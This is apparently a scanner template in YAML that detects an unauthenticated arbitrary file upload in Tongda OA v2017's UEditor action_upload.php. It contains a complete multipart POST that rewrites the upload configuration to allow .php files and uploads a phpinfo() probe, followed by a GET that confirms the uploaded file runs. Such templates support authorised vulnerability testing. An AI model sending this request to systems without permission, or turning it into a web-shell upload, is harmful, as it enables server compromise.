expression: r0() && r1()
id: tongda-v2017-uploadfile
info:
  author: zan8in
  description: "\u901A\u8FBEOA v2017 action_upload.php \u6587\u4EF6\u8FC7\u6EE4\u4E0D\
    \u8DB3\u4E14\u65E0\u9700\u540E\u53F0\u6743\u9650\uFF0C\u5BFC\u81F4\u4EFB\u610F\
    \u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E\napp=\"TDXK-\u901A\u8FBEOA\"\n"
  name: "\u901A\u8FBEOA v2017 action_upload.php \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\
    \u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20action_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
  severity: critical
  verified: false
rules:
  r0:
    request:
      body: "------------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
        \ name=\"CONFIG[fileFieldName]\"\r\n\r\nffff\r\n------------WebKitFormBoundary{{rboundary}}\r\
        \nContent-Disposition: form-data; name=\"CONFIG[fileMaxSize]\"\r\n\r\n1000000000\r\
        \n------------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data;\
        \ name=\"CONFIG[filePathFormat]\"\r\n\r\ntcmd\r\n------------WebKitFormBoundary{{rboundary}}\r\
        \nContent-Disposition: form-data; name=\"CONFIG[fileAllowFiles][]\"\r\n\r\n\
        .php\r\n------------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition:\
        \ form-data; name=\"ffff\"; filename=\"{{rand1}}.php\"\r\nContent-Type: application/octet-stream\r\
        \n\r\n<?php phpinfo();?>\r\n------------WebKitFormBoundary{{rboundary}}\r\n\
        Content-Disposition: form-data; name=\"mufile\"\r\n\r\nsubmit\r\n------------WebKitFormBoundary{{rboundary}}--\r\
        \n"
      expression: response.status == 200
      headers:
        Content-Type: multipart/form-data; boundary=----------WebKitFormBoundary{{rboundary}}
      method: POST
      path: /module/ueditor/php/action_upload.php?action=uploadfile
  r1:
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      method: GET
      path: /{{rand1}}.php
set:
  md5str: md5(rand1)
  rand1: randomLowercase(12)
  rboundary: randomLowercase(8)
